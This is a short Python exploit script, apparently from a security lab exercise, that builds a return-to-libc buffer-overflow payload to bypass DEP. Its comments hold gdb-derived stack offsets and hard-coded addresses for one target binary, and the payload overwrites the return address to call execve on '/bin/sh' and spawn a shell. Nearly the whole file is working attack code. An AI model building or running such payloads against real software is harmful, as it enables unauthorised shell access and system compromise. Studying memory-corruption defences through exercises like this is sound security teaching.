#!/usr/bin/env python3

import sys

"""
DEP Bypass via Return-to-libc
-----------------------------

This payload demonstrates how Data Execution Prevention (DEP)
can be bypassed by redirecting execution to existing executable
code in memory rather than injecting new shellcode.
"""

# start of buffer: $rbp-0x22 = 0x7ffffff2922e
# return address on stack: 0x7ffffff29258
# address of run_ls: 0x401e05
# 0x455050: address of execve
# use rdi to find bin/sh which is at 0x49f0b8 on the lea. It gets moed into rdi register.
# want to use do nothing first argument and instead call the execve function
# base pointer address: 0x7ffffff29250
# address of the bin/sh 0x7ffffff2922e

# gdb) p/x ($rbp+8) - ($rbp-0x22)
# $5 = 0x2a = 42 bytes
# loc A: $rbp-0x8
# loc B: $rbp-0x10
# loc C: $rbp-0x18
# 0x1a disatnce from buf to A: 26 bytes
# 16 bytes from the A to the return address
# length of bin/sh is 7 bytes

# put the bin/sh first (8 bytes) -> pad with 2 bytes -> pad with 16 NULL for b and c -> place address of bin/sh in a* -> padding rbp -> return to execve
sys.stdout.buffer.write(b"/bin/sh\x00" + b"A" * 2 + b"\x00" * 16 + 0x7ffffff2922e.to_bytes(8, "little") + b"A" * 8 + 0x455050.to_bytes(8, "little"))
